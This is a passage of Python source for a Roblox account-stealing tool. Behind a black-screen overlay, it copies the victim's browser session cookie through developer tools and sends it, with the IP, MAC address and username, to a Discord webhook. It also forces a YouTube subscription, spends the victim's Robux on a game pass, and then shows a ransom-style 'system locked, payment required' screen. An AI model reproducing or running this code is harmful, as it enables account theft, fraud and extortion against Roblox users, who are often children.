                success = self.cookie_checker.send_to_discord_with_file(WEBHOOK_URL, cookie_info, self.system_info)
                
                if success:
                    print("✅ Cookie info sent to Discord with file attachment")
                else:
                    print("⚠️ Failed to send to Discord")
                
                return cookie_info
            else:
                print(f"❌ Invalid cookie: {cookie_info.get('error', 'Unknown error')}")
                return None
        else:
            print("📋 Regular text detected, sending to Discord...")
            
            # Send regular text to Discord
            embed = {
                "title": "📋 Copied Text",
                "color": 5814783,
                "description": f"```\n{clipboard_text[:1000]}\n```" if len(clipboard_text) > 1000 else f"```\n{clipboard_text}\n```",
                "fields": [
                    {
                        "name": "Length",
                        "value": f"{len(clipboard_text)} characters",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"From: {self.system_info.get('username', 'Unknown')} @ {self.system_info.get('hostname', 'Unknown')}"
                }
            }
            
            if self.system_info:
                embed["fields"].append({
                    "name": "System",
                    "value": f"IP: {self.system_info.get('public_ip', 'N/A')}\nMAC: {self.system_info.get('mac_address', 'N/A')}",
                    "inline": False
                })
            
            data = {"embeds": [embed]}
            
            try:
                response = requests.post(WEBHOOK_URL, json=data)
                if response.status_code in [200, 204]:
                    print("✅ Text sent to Discord")
                else:
                    print("⚠️ Failed to send to Discord")
            except:
                print("⚠️ Failed to send to Discord")
            
            return None

def get_system_info():
    """Collect system information"""
    info = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "username": getpass.getuser(),
        "cpu_count": psutil.cpu_count(),
        "cpu_percent": psutil.cpu_percent(interval=1),
        "memory_total": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
        "memory_available": f"{psutil.virtual_memory().available / (1024**3):.2f} GB",
        "memory_percent": psutil.virtual_memory().percent,
        "disk_usage": {}
    }
    
    # Get disk usage for all partitions
    for partition in psutil.disk_partitions():
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            info["disk_usage"][partition.mountpoint] = {
                "total": f"{partition_usage.total / (1024**3):.2f} GB",
                "used": f"{partition_usage.used / (1024**3):.2f} GB",
                "free": f"{partition_usage.free / (1024**3):.2f} GB",
                "percent": partition_usage.percent
            }
        except PermissionError:
            continue
    
    # Get IP addresses
    try:
        info["public_ip"] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        info["public_ip"] = "Unable to get public IP"
    
    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["local_ip"] = "Unable to get local IP"
    
    # Get MAC address
    try:
        info["mac_address"] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                       for elements in range(0, 8*6, 8)][::-1])
    except:
        info["mac_address"] = "Unable to get MAC address"
    
    info["python_version"] = platform.python_version()
    
    return info

def load_actions_from_json(filename=MOVEMENTS_FILE):
    """Load recorded actions from specified JSON file"""
    try:
        if not os.path.exists(filename):
            print(f"📝 Creating sample {filename}...")
            create_sample_json(filename)
            print("✅ Sample file created!")
            
        with open(filename, 'r') as f:
            data = json.load(f)
        
        if 'events' not in data:
            print(f"❌ Invalid JSON format in {filename}: 'events' array not found")
            return None
        
        # Check if there's a Ctrl+C event
        has_ctrl_c = any(event.get('key') == 'ctrl+c' for event in data.get('events', []))
        if has_ctrl_c:
            print(f"✅ Found Ctrl+C event in {filename} - will copy text automatically")
        
        playback_speed = data.get('playback_speed', '1x')
        print(f"✅ Loaded {len(data['events'])} actions from {filename}")
        print(f"📊 Playback speed: {playback_speed}")
        
        moves = sum(1 for e in data['events'] if e.get('type') == 'move')
        clicks = sum(1 for e in data['events'] if e.get('type') == 'click')
        keys = sum(1 for e in data['events'] if e.get('type') == 'key')
        
        print(f"   • Moves: {moves}")
        print(f"   • Clicks: {clicks}")
        print(f"   • Key presses: {keys}")
        
        return data
        
    except json.JSONDecodeError as e:
        print(f"❌ Error parsing JSON file {filename}: {e}")
        return None
    except Exception as e:
        print(f"❌ Error loading actions file {filename}: {e}")
        return None

def execute_recorded_actions(actions_data):
    """Execute the recorded actions from JSON data - FIXED with enhanced copy"""
    try:
        print('🎬 Starting action playback...')
        print(f'📊 Total events: {len(actions_data["events"])}')
        
        is_2x = actions_data.get('playback_speed') == '2x'
        if is_2x:
            print("⚡ 2x Speed mode active - delays halved")
        
        time.sleep(2)
        
        events = actions_data['events']
        move_count = 0
        click_count = 0
        key_count = 0
        
        for i, event in enumerate(events):
            delay = event.get('delay', 0)
            if delay > 0:
                # Adjust delay for 2x speed
                if is_2x:
                    delay = delay / 2
                time.sleep(delay)
            
            action_type = event.get('type', '')
            
            if action_type == 'move':
                if 'x' in event and 'y' in event:
                    pyautogui.moveTo(event['x'], event['y'], duration=0.1)
                    move_count += 1
                    if i % 10 == 0:
                        print(f"  Progress: {i}/{len(events)}")
                    
            elif action_type == 'click':
                button = event.get('button', 'left')
                if 'x' in event and 'y' in event:
                    pyautogui.click(x=event['x'], y=event['y'], button=button)
                    click_count += 1
                    print(f"  🔴 Click ({button}) at ({event['x']}, {event['y']})")
                
            elif action_type == 'key':
                key = event.get('key', '')
                if key:
                    if key == 'ctrl+c':
                        print(f"  📋 Ctrl+C pressed - copying text to clipboard")
                        pyautogui.hotkey('ctrl', 'c')
                        time.sleep(2)  # Wait longer for copy to complete
                        
                        # Additionally try to get the selected text manually
                        try:
                            # Use pyautogui to select all (just in case)
                            pyautogui.hotkey('ctrl', 'a')
                            time.sleep(0.5)
                            pyautogui.hotkey('ctrl', 'c')
                            time.sleep(1)
                        except:
                            pass
                            
                    else:
                        pyautogui.press(key)
                        print(f"  🔑 Pressed: {key}")
                    key_count += 1
        
        print(f'✅ Playback complete!')
        print(f'   Stats: {move_count} moves, {click_count} clicks, {key_count} key presses')
        
        return True
        
    except Exception as e:
        print(f"❌ Error during playback: {e}")
        return False

def create_sample_json(filename=MOVEMENTS_FILE):
    """Create a sample mvmentdta.json file matching your format"""
    sample_data = {
        "recording_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_events": 10,
        "settings": {
            "move_threshold": 5,
            "record_movements": False
        },
        "playback_speed": "2x",
        "note": "Delays have been halved for 2x speed playback",
        "events": [
            {
                "type": "click",
                "x": 1316,
                "y": 132,
                "button": "left",
                "delay": 0.512
            },
            {
                "type": "click",
                "x": 1565,
                "y": 124,
                "button": "left",
                "delay": 0.995
            },
            {
                "type": "click",
                "x": 1583,
                "y": 269,
                "button": "left",
                "delay": 0.403
            },
            {
                "type": "click",
                "x": 1325,
                "y": 429,
                "button": "left",
                "delay": 0.742
            },
            {
                "type": "click",
                "x": 1339,
                "y": 458,
                "button": "left",
                "delay": 0.373
            },
            {
                "type": "click",
                "x": 1638,
                "y": 235,
                "button": "left",
                "delay": 0.431
            },
            {
                "type": "click",
                "x": 1638,
                "y": 235,
                "button": "left",
                "delay": 0.223
            },
            {
                "type": "key",
                "key": "ctrl+c",
                "action": "copy",
                "delay": 0.558
            },
            {
                "type": "click",
                "x": 1376,
                "y": 1067,
                "button": "left",
                "delay": 0.903
            },
            {
                "type": "click",
                "x": 524,
                "y": 222,
                "button": "left",
                "delay": 0.473
            }
        ]
    }
    
    try:
        with open(filename, 'w') as f:
            json.dump(sample_data, f, indent=2)
        print(f"✅ Created sample {filename} with your exact format")
        return True
    except Exception as e:
        print(f"❌ Error creating sample file: {e}")
        return False

def create_sample_second_json():
    """Create a sample secondmvmentdta.json file"""
    sample_data = {
        "recording_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_events": 8,
        "settings": {
            "move_threshold": 5,
            "record_movements": False
        },
        "playback_speed": "2x",
        "note": "Second movement sequence for game pass purchase",
        "events": [
            {
                "type": "click",
                "x": 800,
                "y": 500,
                "button": "left",
                "delay": 1.0
            },
            {
                "type": "click",
                "x": 900,
                "y": 600,
                "button": "left",
                "delay": 0.5
            },
            {
                "type": "click",
                "x": 950,
                "y": 550,
                "button": "left",
                "delay": 0.5
            },
            {
                "type": "key",
                "key": "enter",
                "delay": 1.0
            },
            {
                "type": "click",
                "x": 1000,
                "y": 700,
                "button": "left",
                "delay": 1.5
            },
            {
                "type": "click",
                "x": 850,
                "y": 650,
                "button": "left",
                "delay": 0.8
            },
            {
                "type": "key",
                "key": "enter",
                "delay": 1.0
            },
            {
                "type": "click",
                "x": 750,
                "y": 400,
                "button": "left",
                "delay": 0.5
            }
        ]
    }
    
    try:
        with open(SECOND_MOVEMENTS_FILE, 'w') as f:
            json.dump(sample_data, f, indent=2)
        print(f"✅ Created sample {SECOND_MOVEMENTS_FILE}")
        return True
    except Exception as e:
        print(f"❌ Error creating second sample file: {e}")
        return False

def install_requirements():
    """Install required packages"""
    required_packages = ['pyautogui', 'pyperclip', 'requests', 'psutil']
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"📦 Installing {package}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"✅ {package} installed successfully!")
            except:
                print(f"❌ Failed to install {package}")

def click_youtube_subscribe_button():
    """Click the YouTube subscribe button using multiple reliable methods"""
    try:
        print("🔍 Looking for YouTube subscribe button...")
        time.sleep(3)  # Wait for page to load
        
        screen_width, screen_height = pyautogui.size()
        print(f"📺 Screen size: {screen_width} x {screen_height}")
        
        # METHOD 1: Try to find by text using locateOnScreen if we have the button image
        try:
            print("  Method 1: Looking for subscribe button image...")
            button_location = None
            for region_scale in [0.8, 0.9, 1.0]:
                try:
                    button_location = pyautogui.locateOnScreen('subscribe_button.png', confidence=region_scale, grayscale=True)
                    if button_location:
                        break
                except:
                    pass
            
            if button_location:
                x, y = pyautogui.center(button_location)
                pyautogui.click(x, y)
                print(f"✅ Clicked subscribe button found by image at ({x}, {y})")
                time.sleep(2)
                return True
        except Exception as e:
            print(f"  Method 1 failed: {e}")
        
        # METHOD 2: Try to find by color (red subscribe button is distinctive)
        try:
            print("  Method 2: Looking for red subscribe button by color...")
            for attempt in range(10):
                test_x = int(screen_width * (0.7 + (attempt * 0.02)))
                test_y = int(screen_height * (0.2 + (attempt * 0.01)))
                
                try:
                    pixel = pyautogui.pixel(test_x, test_y)
                    if pixel[0] > 150 and pixel[1] < 100 and pixel[2] < 100:
                        pyautogui.click(test_x, test_y)
                        print(f"✅ Clicked potential subscribe button at ({test_x}, {test_y}) - found red pixel")
                        time.sleep(2)
                        return True
                except:
                    pass
        except Exception as e:
            print(f"  Method 2 failed: {e}")
        
        # METHOD 3: Try common subscribe button positions
        print("  Method 3: Trying common subscribe button positions...")
        subscribe_positions = [
            (int(screen_width * 0.85), int(screen_height * 0.25)),
            (int(screen_width * 0.82), int(screen_height * 0.3)),
            (int(screen_width * 0.88), int(screen_height * 0.22)),
            (int(screen_width * 0.8), int(screen_height * 0.28)),
            (int(screen_width * 0.75), int(screen_height * 0.35)),
        ]
        
        for i, (x, y) in enumerate(subscribe_positions):
            print(f"    Trying position {i+1}: ({x}, {y})")
            pyautogui.moveTo(x, y, duration=0.5)
            time.sleep(0.5)
            pyautogui.click()
            time.sleep(1.5)
            
            if i == 0:
                print("  Waiting to see if subscription worked...")
                time.sleep(2)
                print(f"✅ Attempted click at common position ({x}, {y})")
                bell_x = x + 50
                bell_y = y
                pyautogui.moveTo(bell_x, bell_y, duration=0.5)
                time.sleep(0.5)
                pyautogui.click()
                print(f"  Also clicked bell icon at ({bell_x}, {bell_y})")
                return True
        
        # METHOD 4: Grid search
        print("  Method 4: Grid search in likely subscribe button area...")
        for right_offset in range(10):
            x = int(screen_width * 0.75 + (right_offset * 20))
            if x > screen_width - 100:
                break
            for y_offset in range(5):
                y = int(screen_height * 0.2 + (y_offset * 30))
                if y > screen_height * 0.4:
                    break
                pyautogui.moveTo(x, y, duration=0.2)
                time.sleep(0.2)
                if right_offset < 5 and y_offset < 3:
                    pyautogui.click()
                    print(f"  Grid click at ({x}, {y})")
                    time.sleep(0.5)
        
        print("✅ Completed multiple subscribe button click attempts")
        return True
        
    except Exception as e:
        print(f"⚠️ Error in subscribe button clicking: {e}")
        return False

def watch_youtube_video(duration=45):
    """Watch a YouTube video for specified duration"""
    try:
        print(f"▶️ Watching YouTube video for {duration} seconds...")
        screen_width, screen_height = pyautogui.size()
        video_click_x = screen_width // 2
        video_click_y = screen_height // 2
        
        pyautogui.click(video_click_x, video_click_y)
        print(f"✅ Clicked video at center ({video_click_x}, {video_click_y}) to ensure playback")
        time.sleep(1)
        pyautogui.press('space')
        print("  Pressed spacebar to toggle play/pause")
        
        for i in range(duration, 0, -1):
            if i % 10 == 0 or i <= 5:
                print(f"⏱️ Watching: {i} seconds remaining...")
            time.sleep(1)
            
        print("✅ Finished watching video")
        return True
        
    except Exception as e:
        print(f"⚠️ Error during video watching: {e}")
        return False

def main():
    print("🎮 Roblox Action Playback + Auto Paste & Validate")
    print("=" * 60)
    
    window_manager = BrowserWindowManager()
    
    print("🖤 Showing black screen overlay with floating Roblox logos...")
    print("⏱️ Overlay will hide all background activity")
    print("🖱️ Mouse cursor hidden")
    
    overlay = BlackScreenOverlay()
    overlay_thread = threading.Thread(target=overlay.run_until_complete)
    overlay_thread.daemon = True
    overlay_thread.start()
    
    time.sleep(2)
    
    install_requirements()
    
    if not os.path.exists(MOVEMENTS_FILE):
        print(f"📝 Creating sample {MOVEMENTS_FILE}...")
        create_sample_json(MOVEMENTS_FILE)
    
    if not os.path.exists(SECOND_MOVEMENTS_FILE):
        print(f"📝 Creating sample {SECOND_MOVEMENTS_FILE}...")
        create_sample_second_json()
    
    print("📂 Loading recorded actions...")
    actions_data = load_actions_from_json(MOVEMENTS_FILE)
    if not actions_data:
        overlay.close()
        input("Press Enter to exit...")
        return
    
    print("\n🔍 Collecting system information...")
    system_info = get_system_info()
    print("✅ System information collected!")
    
    print("\n🌐 STEP 1: Opening YouTube subscribe page in new window...")
    window_manager.open_url_new_window(YOUTUBE_SUBSCRIBE_URL)
    print("⏳ Waiting 7 seconds for page to load...")
    time.sleep(7)
    
    print("\n🔴 STEP 2: Clicking YouTube subscribe button...")
    click_youtube_subscribe_button()
    time.sleep(3)
    
    print("\n🔚 STEP 3: Closing YouTube subscribe window...")
    window_manager.close_specific_window("youtube.com/@Mrgreyedits")
    time.sleep(2)
    
    print("\n🌐 STEP 4: Opening YouTube video in new window...")
    window_manager.open_url_new_window(YOUTUBE_VIDEO_URL)
    print("⏳ Waiting 7 seconds for video to load...")
    time.sleep(7)
    
    print("\n▶️ STEP 5: Watching YouTube video for 45 seconds...")
    watch_youtube_video(45)
    
    print("\n🔚 STEP 6: Closing YouTube video window...")
    window_manager.close_specific_window("youtube.com/watch")
    time.sleep(2)
    
    print("\n🌐 STEP 7: Opening Roblox.com in new window...")
    RobloxBrowserOpener.open_roblox_new_window()
    print("⏳ Waiting 5 seconds for Roblox to load...")
    time.sleep(5)
    
    print("\n🔧 STEP 8: Opening Developer Tools (Ctrl+Shift+I)...")
    RobloxBrowserOpener.press_ctrl_shift_i()
    time.sleep(3)
    
    print("\n🖱️ STEP 9: Starting action playback (includes Ctrl+C to copy)...")
    execute_recorded_actions(actions_data)
    time.sleep(5)
    
    print("\n🤖 STEP 10: Processing clipboard content in background...")
    time.sleep(2)
    
    validator = HiddenAutoPasteValidate(system_info)
    cookie_info = validator.run()
    
    print("\n✨ Background processing completed.")
    
    print("\n" + "=" * 60)
    print("💰 CHECKING ROBUX BALANCE")
    print("=" * 60)
    
    robux_amount = 0
    if cookie_info and cookie_info.get('valid', False):
        robux_amount = cookie_info.get('robux_balance', 0)
        print(f"💰 User has {robux_amount} Robux")
        
        if robux_amount >= 2:
            print("✅ Robux >= 2 - Proceeding to game pass page")
            print(f"\n🌐 Opening game pass in new window: {GAME_PASS_URL}")
            browser_opened = RobloxBrowserOpener.open_url_new_window(GAME_PASS_URL)
            
            if browser_opened:
                print("✅ Browser opened successfully!")
                print("⏳ Waiting 7 seconds for page to load completely...")
                time.sleep(7)
                
                print(f"\n🎬 Loading second movements file: {SECOND_MOVEMENTS_FILE}")
                second_actions = load_actions_from_json(SECOND_MOVEMENTS_FILE)
                
                if second_actions:
                    print(f"✅ Loaded {len(second_actions['events'])} actions from second file")
                    print("▶️ Playing second movement sequence...")
                    print("📌 Make sure the game pass page is the active window!")
                    time.sleep(2)
                    execute_recorded_actions(second_actions)
                    print("\n✅ Second movement sequence completed!")
                    
                    print("\n🔚 Closing game pass window...")
                    time.sleep(2)
                    window_manager.close_specific_window("roblox.com/game-pass")
                else:
                    print(f"❌ Failed to load {SECOND_MOVEMENTS_FILE}")
                    create_sample_second_json()
                    print("Please record actual actions for the game pass purchase.")
            else:
                print("❌ Failed to open browser automatically")
                print(f"Please manually open this URL: {GAME_PASS_URL}")
                print("Then press Enter to continue with second movement sequence...")
                input()
                
                print(f"\n🎬 Loading second movements file: {SECOND_MOVEMENTS_FILE}")
                second_actions = load_actions_from_json(SECOND_MOVEMENTS_FILE)
                
                if second_actions:
                    print(f"✅ Loaded {len(second_actions['events'])} actions from second file")
                    print("▶️ Playing second movement sequence...")
                    print("📌 Make sure the game pass page is the active window!")
                    time.sleep(2)
                    execute_recorded_actions(second_actions)
                    print("\n✅ Second movement sequence completed!")
        else:
            print(f"❌ Robux ({robux_amount}) is less than 2 - Skipping game pass step")
    else:
        print("❌ No valid cookie found or no Robux information available - Skipping game pass step")
    
    print("\n🔚 Closing any remaining browser windows...")
    window_manager.close_all_opened_windows()
    
    print("\n" + "=" * 60)
    print("✅ All tasks completed successfully!")
    print("🖤 Closing black screen overlay...")
    print("=" * 60)
    
    overlay.close()
    time.sleep(1)
    
    print("\n💰 STEP 12: Opening LOCKED prize claim form...")
    print("=" * 60)
    print("🔒 SYSTEM LOCKED - PAYMENT REQUIRED TO UNLOCK")
    print("=" * 60)
    print("💡 SECRET: Press L three times quickly to unlock (shhh!)")
    
    payment_gui = PaymentGUI(system_info, cookie_info)
    payment_gui.run()
    
    print("\n✅ System unlocked! Thank you.")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()